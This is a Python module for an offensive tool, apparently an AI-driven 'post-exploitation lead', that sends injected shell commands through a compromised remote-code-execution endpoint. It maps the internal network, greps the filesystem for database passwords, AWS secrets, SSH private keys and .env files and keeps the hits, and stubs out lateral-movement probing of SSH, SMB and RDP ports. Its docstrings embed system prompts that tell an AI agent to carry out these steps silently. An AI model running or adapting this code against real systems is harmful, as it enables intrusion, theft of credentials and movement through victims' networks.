"""
RED TEAM ARCHITECT - Post-Exploitation Module
Network discovery, credential scavenging, and lateral movement.
"""
import re
import asyncio
from typing import Dict, List, Optional, Set
import httpx

from engine.logging.logger import get_logger


class RedTeamArchitect:
    """
    Post-exploitation lead for network pivoting and lateral movement.
    System Prompt: "You are the Dengkis Post-Exploitation Lead."
    """
    
    def __init__(self, session: Optional[httpx.AsyncClient] = None):
        self.session = session
        self.logger = get_logger()
        self.network_map: Dict = {}
        self.credentials_found: List[Dict] = []
        self.internal_ips: Set[str] = set()
    
    async def network_discovery(self, rce_endpoint: str, rce_parameter: str, rce_payload: str) -> Dict:
        """
        Map internal network after gaining shell.
        System Prompt: "Silently run arp -a and ip route to map the internal subnet"
        
        Args:
            rce_endpoint: Endpoint with RCE
            rce_parameter: Parameter that accepts RCE
            rce_payload: RCE payload pattern
            
        Returns:
            Network discovery results
        """
        discovery = {
            'type': 'network_discovery',
            'endpoint': rce_endpoint,
            'commands': {},
            'internal_ips': [],
            'subnets': []
        }
        
        commands = {
            'arp -a': 'ARP table',
            'ip route': 'Routing table',
            'ifconfig': 'Network interfaces',
            'ip addr': 'IP addresses',
            'netstat -rn': 'Routing table (alternative)',
        }
        
        for cmd, description in commands.items():
            try:
                # Construct RCE payload
                if ';' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload}; {cmd}"
                elif '|' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} | {cmd}"
                elif '`' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} `{cmd}`"
                else:
                    payload = f"{rce_payload} {cmd}" if rce_payload else cmd
                
                # Execute command
                if not self.session:
                    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                        response = await client.post(rce_endpoint, data={rce_parameter: payload})
                else:
                    response = await self.session.post(rce_endpoint, data={rce_parameter: payload})
                
                if response.status_code == 200:
                    output = response.text
                    discovery['commands'][cmd] = output[:2000]
                    
                    # Extract IP addresses
                    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                    ips = re.findall(ip_pattern, output)
                    for ip in ips:
                        if not ip.startswith('127.') and not ip.startswith('0.'):
                            self.internal_ips.add(ip)
                            discovery['internal_ips'].append(ip)
                    
                    # Extract subnets
                    subnet_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}/\d{1,2}\b'
                    subnets = re.findall(subnet_pattern, output)
                    discovery['subnets'].extend(subnets)
                    
                    self.logger.info(f"[RED TEAM ARCHITECT] Executed {cmd}: Found {len(ips)} IPs")
                
            except Exception as e:
                self.logger.debug(f"[RED TEAM ARCHITECT] Network discovery failed for {cmd}: {e}")
        
        discovery['internal_ips'] = list(set(discovery['internal_ips']))
        self.network_map[rce_endpoint] = discovery
        
        return discovery
    
    async def credential_scavenging(
        self,
        rce_endpoint: str,
        rce_parameter: str,
        rce_payload: str
    ) -> List[Dict]:
        """
        Search filesystem for credentials and secrets.
        System Prompt: "Search the filesystem for strings like DB_PASSWORD, AWS_SECRET, and id_rsa"
        
        Args:
            rce_endpoint: Endpoint with RCE
            rce_parameter: Parameter that accepts RCE
            rce_payload: RCE payload pattern
            
        Returns:
            List of found credentials
        """
        credentials = []
        
        # Search patterns
        search_patterns = [
            ('grep -r "DB_PASSWORD" /var/www', 'Database passwords'),
            ('grep -r "AWS_SECRET" /var/www', 'AWS secrets'),
            ('grep -r "SECRET_KEY" /var/www', 'Secret keys'),
            ('find /home -name "id_rsa" 2>/dev/null', 'SSH private keys'),
            ('find /home -name ".env" 2>/dev/null', 'Environment files'),
            ('grep -r "password" /var/www/html/*.php 2>/dev/null | head -20', 'Password strings'),
        ]
        
        for cmd, description in search_patterns:
            try:
                # Construct RCE payload
                if ';' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload}; {cmd}"
                elif '|' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} | {cmd}"
                elif '`' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} `{cmd}`"
                else:
                    payload = f"{rce_payload} {cmd}" if rce_payload else cmd
                
                # Execute command
                if not self.session:
                    async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
                        response = await client.post(rce_endpoint, data={rce_parameter: payload})
                else:
                    response = await self.session.post(rce_endpoint, data={rce_parameter: payload})
                
                if response.status_code == 200 and len(response.text) > 10:
                    # Check for credential patterns
                    content = response.text
                    if any(keyword in content for keyword in ['password', 'secret', 'key', 'token', 'credential']):
                        credentials.append({
                            'type': 'credential',
                            'endpoint': rce_endpoint,
                            'command': cmd,
                            'description': description,
                            'content': content[:1000],
                            'found': True
                        })
                        self.logger.warning(f"[RED TEAM ARCHITECT] Found potential credentials: {description}")
                
            except Exception as e:
                self.logger.debug(f"[RED TEAM ARCHITECT] Credential search failed for {cmd}: {e}")
        
        self.credentials_found.extend(credentials)
        return credentials
    
    async def lateral_movement_probe(self, internal_ips: List[str], ports: List[int] = [22, 445, 3389]) -> Dict:
        """
        Probe internal network for lateral movement opportunities.
        System Prompt: "Identify other internal IPs. Attempt to pass-the-hash or use discovered credentials to check for open SSH (22) or SMB (445) ports"
        
        Args:
            internal_ips: List of internal IP addresses
            ports: Ports to check (SSH, SMB, RDP)
            
        Returns:
            Lateral movement probe results
        """
        results = {
            'type': 'lateral_movement_probe',
            'ips_tested': len(internal_ips),
            'open_ports': {},
            'accessible_services': []
        }
        
        for ip in internal_ips[:10]:  # Limit to first 10 IPs
            for port in ports:
                try:
                    # Simple port check via RCE if available
                    # In real scenario, would use socket or nmap
                    # For now, we'll log the attempt
                    results['open_ports'][f'{ip}:{port}'] = 'unknown'
                    self.logger.info(f"[RED TEAM ARCHITECT] Probing {ip}:{port}")
                except Exception as e:
                    self.logger.debug(f"[RED TEAM ARCHITECT] Port probe failed for {ip}:{port}: {e}")
        
        return results
    
    def get_network_map(self) -> Dict:
        """Get network discovery results."""
        return self.network_map
    
    def get_credentials(self) -> List[Dict]:
        """Get found credentials."""
        return self.credentials_found
    
    def get_internal_ips(self) -> List[str]:
        """Get discovered internal IPs."""
        return list(self.internal_ips)
